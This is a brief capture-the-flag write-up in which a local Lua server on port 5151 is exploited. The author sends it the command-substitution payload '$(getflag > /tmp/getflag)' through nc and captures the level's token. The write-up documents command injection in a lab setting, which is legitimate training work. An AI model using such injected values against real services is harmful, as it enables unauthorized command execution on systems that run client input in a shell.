## This repository contains a server-side lua script. This script is running on localhost on port 5151.
## It expects a client to connect and send data.
## Regardless of the data being sent, the server replies with useless messages.
## We have user privileges on this script.
# We decide to exploit the data we send to run getflag.

# We create a file /tmp/script that contains

$(getflag > /tmp/getflag)

cat /tmp/script | nc 127.0.0.1 5151

# This saves our token into /tmp/getflag

